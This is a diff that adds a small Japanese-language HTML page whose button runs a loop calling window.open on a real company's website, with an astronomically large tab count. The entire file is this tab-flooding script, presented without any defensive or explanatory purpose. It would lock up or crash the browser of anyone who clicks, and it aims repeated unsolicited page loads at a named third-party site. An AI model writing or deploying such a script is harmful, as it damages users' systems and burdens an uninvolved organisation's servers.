@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>複数ページオープナー</title>
+</head>
+<body>
+    <h1>複数ページを開く</h1>
+    <button onclick="openMultiplePages()">ページを開く</button>
+
+    <script>
+        function openMultiplePages() {
+            const url = "https://www.benesse.co.jp/";
+            const count = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // 開くタブの数
+
+            for (let i = 0; i < count; i++) {
+                window.open(url, '_blank');
+            }
+        }
+    </script>
+</body>
+</html>
